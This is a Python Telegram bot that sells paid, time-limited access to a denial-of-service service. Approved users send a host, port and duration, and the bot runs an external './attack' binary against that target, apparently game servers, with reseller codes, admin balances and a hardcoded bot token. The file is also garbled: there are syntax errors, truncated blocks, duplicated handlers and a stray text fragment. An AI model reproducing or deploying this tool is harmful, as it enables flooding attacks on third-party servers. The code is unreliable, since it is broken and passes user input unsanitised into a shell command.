/usr/bin/python3

import telebot
import subprocess
import random
import string
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot("6587257084:AAFgqNYDCK627VFwdqcZy3-haYUTxENI0EQ")

# Owner user ID
owner_id = "5628960731"

# Admin user IDs
admin_ids = ["YOUR_ADMIN_ID"]

# File to store allowed user IDs
USER_FILE = "users.txt"

#
# Function to generate a random code with a specific prefix
def generate_code(prefix=""):
    characters = string.ascii_letters + string.digits
    code = prefix + '-' + ''.join(random.choice(characters) for _ in range(8))
    return code

# Dictionary to store generated codes with expiry times and approval times
generated_codes = {}

 File to store command logs
LOG_FILE = "log.txt"

# Admin balance
admin_balance = {}

# Temporary storage for attack details
pending_attacks = {}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load allowed user and admin IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False

    user_approval_expiry[user_id] = expiry_date
    return True

@bot.message_handler(commands=['approve'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        # Check if the user is an admin and has sufficient balance
        if user_id in admin_ids and admin_balance.get(user_id, 0) <= 0:
            response = "Your admin balance is depleted. You cannot approve more users."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ['hour', 'd', 'week', 'month']:
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    user_name = f"@{user_to_add}"  # Replace with actual method to get username if available
                    response = f"User {user_name} (ID: {user_to_add}) approved for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                    # Decrement the admin balance
                    if user_id in admin_balance:
                        admin_balance[user_id] -= 1
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You are not authorized to approve users."

    bot.reply_to(message, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id != owner_id:
        bot.reply_tomessage, "Only the owner can add new admins.")
        return

    command = message.text.split()
    if len(command) <= 2:
        bot.reply_to(message, "Please specify the user ID and the balance to add as an admin.")
        return

    new_admin_id = command[1]
    try:
        new_admin_balance = int(command[2])
        if new_admin_balance <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "Invalid balance. Please provide a positive integer.")
        return

    if new_admin_id in admin_ids:
        response = "User is already an admin."
    else:
        admin_ids.append(new_admin_id)
        admin_balance[new_admin_id] = new_admin_balance  # Set the balance for the new admin
        response = f"User {new_admin_id} added as an admin successfully with a balance of {new_admin_balance}."

    bot.reply_to(message, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id != owner_id:
        bot.reply_to(message, "Only the owner can remove admins.")
        return

    command = message.text.split()
    if len(command) <= 1:
        bot.reply_to(message, "Please specify the user ID to remove as an admin.")
        return

    admin_id_to_remove = command[1]

    if admin_id_to_remove not in admin_ids:
        response = "User is not an admin."
    else:
        admin_ids.remove(admin_id_to_remove)
        admin_balance.pop(admin_id_to_remove, None)  # Remove the balance entry for the admin
        response = f"User {admin_id_to_remove} removed as an admin successfully."

    bot.reply_to(message, response)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        balance = admin_balance.get(user_id, 0)
        response = f"Your current balance is: {balance}"
    else:
        response = "You are not authorized to check balance."
    bot.reply_to(message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) > 2:
            admin_id = command[1]
            try:
                amount = int(command[2])
                if admin_id in admin_ids:
                    admin_balance[admin_id] = admin_balance.get(admin_id, 0) + amount
                    response = f"Balance added successfully! New balance for {admin_id}: {admin_balance[admin_id]}"
                else:
                    response = "User is not an admin."
            except ValueError:
                response = "Invalid amount. Please provide a positive integer."
        else:
            response = "Please specify the admin ID and the amount to add."
    else:
        response = "Only the owner can add balance."
    bot.reply_to(message, response)

@bot.message_handler(commands=['removeapproval'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    file.write("\n".join(allowed_user_ids))
                response = f"User {user_to_remove} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "You are not authorized to remove users."
    bot.reply_to(message, response)
# Function to generate a random code
def generate_code():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(10))

# Dictionary to store generated codes with expiry times
generated_codes = {}

@bot.message_handler(commands=['generatecode'])
def generate_code_handler(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        code = generate_code()
        expiry_time = datetime.datetime.now() + datetime.timedelta(minutes=30)
        generated_codes[code] = expiry_time
        response = f"Generated code: {code}. This code will expire in 30 minutes."
    else:
    @bot.message_handler(commands=['redeem'])
def redeem_code_handler(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        code = command[1]
        expiry_info = generated_codes.get(code)
        if expiry_info:
            expiry_time, approval_time = expiry_info
            remaining_time = expiry_time - datetime.datetime.now()
            if remaining_time.total_seconds() > 0:
                response = f"Gift code {code} redeemed successfully! You have been approved for {approval_time}."
                
                # Add user ID to allowed_user_ids
                if user_id not in allowed_user_ids:
                    allowed_user_ids.append(user_id)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_id}\n")
                
                # Set approval expiry date
                set_approval_expiry_date(user_id, *approval_time.split())
                
                # Remove the code after successful redemption
                del generated_codes[code]
            else:
                response = "This code has expired."
        else:
            response = "Invalid code."
    else:
        response = "USAGE: /redeem <code>"
    bot.reply_to(message, response)

# Dictionary to store generated codes with expiry times and approval times
generated_codes = {}

# Function to generate a random code with a specific prefix
def generate_code(prefix=""):
    characters = string.ascii_letters + string.digits
    code = prefix + '-' + ''.join(random.choice(characters) for _ in range(8))
    return code

@bot.message_handler(commands=['generatecodes'])
def generate_codes_handler(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        # Generate ULTRA PREMIUM CODE
        ultra_premium_code = generate_code(prefix="EXTREME-VIP")
        ultra_premium_expiry = datetime.datetime.now() + datetime.timedelta(week=1)
        generated_codes[ultra_premium_code] = (ultra_premium_expiry, '1 week')
        ultra_premium_response = f"🚀 ULTRA PREMIUM CODE 🚀\n💖 REDEEM YOUR ULTRA PREMIUM CODE: `{ultra_premium_code}`\n\n"

        # Generate PREMIUM CODES
        premium_codes = []
        for _ in range(2):
            code = generate_code(prefix="PREMIUM")
            expiry_time = datetime.datetime.now() + datetime.timedelta(days=1)
            generated_codes[code] = (expiry_time, '1 day')
            premium_codes.append(f"🥱 REDEEM YOUR PREMIUM CODE: `{code}`")

        # Generate NORMAL CODES
        normal_codes = []
        for _ in range(10):
            code = generate_code(prefix="NORMAL")
            expiry_time = datetime.datetime.now() + datetime.timedelta(hours=6)
            generated_codes[code] = (expiry_time, '6 hours')
            normal_codes.append(f"Please redeem your Gift code: `{code}` 🎁.")

        # Combine all responses
        premium_response = "\n\n🛸 PREMIUM CODES 🛸\n" + "\n".join(premium_codes)
        normal_response = "\n\nNORMAL CODES\n" + "\n".join(normal_codes)

        response = ultra_premium_response + premium_response + normal_response
        bot.reply_to(message, response, parse_mode='Markdown')
    else:
        bot.reply_to(message, "You are not authorized to generate codes.")


# Cooldown dictionary
bgmi_cooldown = {}

# Function to reply when attack starts
def start_attack_reply(message, target, port, time):
    reply_message = (f"🚀 Attack started successfully! 🚀\n\n"
                     f"🔹Target: {target}:{port}\n"
                     f"⏱️Duration: {time}\n"
                     f"🔧Method: BGMI-VIP\n"
                     f"🔥Status: Attack is started..")
    bot.reply_to(message, reply_message)

# Function to reply when attack finishes
def attack_finished_reply(message, target, port, time):
    reply_message = (f"🚀 Attack finished Successfully! 🚀\n\n"
                     f"🗿Target: {target}:{port}\n"
                     f"🕦Attack Duration: {time}\n"
                     f"🔥Status: Attack is finished 🔥")
    bot.reply_to(message, reply_message)

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:   
        # Check if the user is in admin_ids (admins have no cooldown)
        if user_id not in admin_ids:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                remaining_time = 3 - (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                response = f"You must wait {remaining_time:.2f} seconds before initiating another attack."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./attack {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                attack_finished_reply(message, target, port, time)  # Call attack_finished_reply function
                
        else:
            response = "To use the attack command, type it in the following format:\n\n /attack <host> <port> <time>"
    else:
        response = """🚫 Unauthorized Access! 🚫

Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""

    bot.reply_to(message, response)

# Handler for "🚀 Attack" message
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def initiate_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        pending_attacks[user_id] = True  # Mark that user has initiated an attack
        response = "Please provide the details for the attack in the following format:\n\n<host> <port> <time>"
    else:
        response = """🚫 Unauthorized Access! 🚫

Oops! It seems like you don't have permission to initiate an attack. To gain access, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
    
    bot.reply_to(message, response)

# Handler for processing attack details after "🚀 Attack"
@bot.message_handler(func=lambda message: str(message.chat.id) in pending_attacks)
def process_attack_details(message):
    user_id = str(message.chat.id)
    if user_id in pending_attacks:
        details = message.text.split()
        if len(details) == 3:
            target = details[0]
            port = int(details[1])
            time = int(details[2])
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '🚀 Attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./attack {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                attack_finished_reply(message, target, port, time)  # Call attack_finished_reply function
                del pending_attacks[user_id]  # Clear pending attack
                return
        else:
            response = "Invalid format. Please provide the details in the following format:\n\n<host> <port> <time>"
        
        bot.reply_to(message, response)



# Function to handle the main menu
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('🚀 Attack')
    btn2 = telebot.types.KeyboardButton('💼 ResellerShip')
    btn3 = telebot.types.KeyboardButton('ℹ️ My Info')

    # Arrange buttons with '🚀 Attack' on top and the other two side by side below
    markup.row(btn1)  # First row with '🚀 Attack'
    markup.row(btn2, btn3)  # Second row with '💼 ResellerShip' and 'ℹ️ My Info'

    bot.send_message(message.chat.id, "Welcome! Please choose an option:", reply_markup=markup)

# Function to handle Attack button
@bot.message_handler(func=lambda message:message.text== '🚀 Attack')
def handle_attack_button(message):
    bot.reply_to(message,"To use the attack command, type it in the following format:\n\n <host> <port> <time>.")

# Function to handle ResellerShip button
@bot.message_handler(func=lambda message: message.text == '💼 ResellerShip')
def handle_resellership(message):
    bot.reply_to(message, "Contact @EXTREMERESELLINGBOT_bot for reseller ship.")

# Function to handle My Info button
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else "N/A"
    
    if user_id == owner_id:
        user_role = "Owner"
    elif user_id in admin_ids:
        user_role = "Admin"
    else:
        user_role = "User"
    
    approval_expiry_date = user_approval_expiry.get(user_id, 'Not approved')
    
    response = (
        f"👤 User Info 👤\n\n"
        f"🔖 Role: {user_role}\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"👤 Username: {username}\n"
        f"⏳ Approval Expiry: {approval_expiry_date}"
    )
    bot.reply_to(message, response, parse_mode="HTML")
bot.polling()




erience? Take action and get ready for powerful attacks!"""


# Function to reply when attack finishes
def attack_finished_reply(message, target, port, time):
    reply_message = (f"🚀 Attack finished Successfully! 🚀\n\n"
                     f"🗿Target: {target}:{port}\n"
                     f"🕦Attack Duration: {time}\n"
                     f"🔥Status: Attack is finished 🔥")
    bot.reply_to(message, reply_message)

    bot.reply_to(message,response)

# Handler for "🚀 Attack" message
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def initiate_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        pending_attacks[user_id] = True  # Mark that user has initiated an attack
        response = "Please provide the details for the attack in the following format:\n\n<host> <port> <time>"
    else:
        response = """🚫 Unauthorized Access! 🚫

Oops! It seems like you don't have permission to initiate an attack. To gain access, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
    
    bot.reply_to(message, response)

# Handler for processing attack details after "🚀 Attack"
@bot.message_handler(func=lambda message: str(message.chat.id) in pending_attacks)
def process_attack_details(message):
    user_id = str(message.chat.id)
    if user_id in pending_attacks:
        details = message.text.split()
        if len(details) == 3:
            target = details[0]
            port = int(details[1])
            time = int(details[2])
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '🚀 Attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./attack {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                attack_finished_reply(message, target, port, time)  # Call attack_finished_reply function
                del pending_attacks[user_id]  # Clear pending attack
                return
        else:
            response = "Invalid format. Please provide the details in the following format:\n\n<host> <port> <time>"
        
        bot.reply_to(message, response)

# Function to handle the main menu
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('🚀 Attack')
    btn2 = telebot.types.KeyboardButton('💼 ResellerShip')
    btn3 = telebot.types.KeyboardButton('ℹ️ My Info')

    # Arrange buttons with '🚀 Attack' on top and the other two side by side below
    markup.row(btn1)  # First row with '🚀 Attack'
    markup.row(btn2, btn3)  # Second row with '💼 ResellerShip' and 'ℹ️ My Info'

    bot.send_message(message.chat.id, "Welcome! Please choose an option:", reply_markup=markup)

# Function to handle Attack button
@bot.message_handler(func=lambda message:message.text== '🚀 Attack')
def handle_attack_button(message):
    bot.reply_to(message,"To use the attack command, type it in the following format:\n\n/attack <host> <port> <time>.")

# Function to handle ResellerShip button
@bot.message_handler(func=lambda message: message.text == '💼 ResellerShip')
def handle_resellership(message):
    bot.reply_to(message, "Contact @EXTREMERESELLINGBOT_bot for reseller ship.")

# Function to handle My Info button
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else "N/A"
    
    if user_id == owner_id:
        user_role = "Owner"
    elif user_id in admin_ids:
        user_role = "Admin"
    else:
        user_role = "User"
    
    approval_expiry_date = user_approval_expiry.get(user_id, 'Not approved')
    
    response = (
        f"👤 User Info 👤\n\n"
        f"🔖 Role: {user_role}\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"👤 Username: {username}\n"
        f"⏳ Approval Expiry: {approval_expiry_date}"
    )
    bot.reply_to(message, response, parse_mode="HTML")
bot.polling()
